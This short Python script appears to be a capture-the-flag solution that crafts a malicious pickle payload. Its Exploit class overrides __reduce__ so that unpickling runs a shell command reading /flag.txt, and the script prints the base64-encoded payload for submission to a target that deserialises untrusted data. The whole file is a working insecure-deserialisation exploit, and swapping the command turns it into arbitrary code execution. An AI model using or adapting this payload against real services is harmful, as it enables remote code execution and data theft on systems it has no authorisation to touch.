import subprocess
import base64
import pickle

class Exploit(object):
    def __reduce__(self):
        return (subprocess.check_output, (['cat','/flag.txt'],))

output = base64.b64encode(pickle.dumps(Exploit()))
print(output)

